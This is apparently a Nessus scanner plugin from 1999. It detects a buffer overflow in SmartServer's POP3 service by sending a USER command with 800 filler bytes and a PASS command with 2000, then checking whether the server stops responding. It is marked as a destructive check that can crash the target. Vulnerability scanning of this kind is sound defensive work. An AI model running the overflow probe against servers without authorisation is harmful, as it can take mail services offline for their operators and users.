#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10257);
 script_bugtraq_id(790);
 script_version ("$Revision: 1.13 $");
 
 name["english"] = "SmartServer pop3 overflow";
 name["francais"] = "Divers dépassement de buffers dans SmartServer pop3";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote pop3 server seems vulnerable to a buffer overflow when issued a 
very long command.

This *may* allow an attacker to execute arbitrary commands
as root on the remote POP3 server.

Solution : contact your vendor, inform it of this
vulnerability, and ask for a patch

Risk factor : High";


 desc["francais"] = "
Le serveur pop distant est vulnérable à un dépassement
de buffer lorsqu'il recoit une commande trop longue.
	
Ce problème pourrait permettre à un pirate d'executer des
commandes en tant que root sur le serveur distant.

Solution : demandez un patch
Facteur de risque : Elevé";
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to overflow the in.pop3d buffers";
 summary["francais"] = "Essaye de trop remplir les buffers de in.pop3d";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv_line(socket:soc, length:4096);
  if(!r)exit(0);
  if ( "smart" >!< tolower(r)) exit(0);
  
  c = string("USER ", crap(800), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(2000), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  if(!d)
    {
    security_hole(port);
    }
  else {
    soc2 = open_sock_tcp(port);
    if(!soc2)security_hole(port);
    else close(soc2);
    }
 close(soc);
 }
}

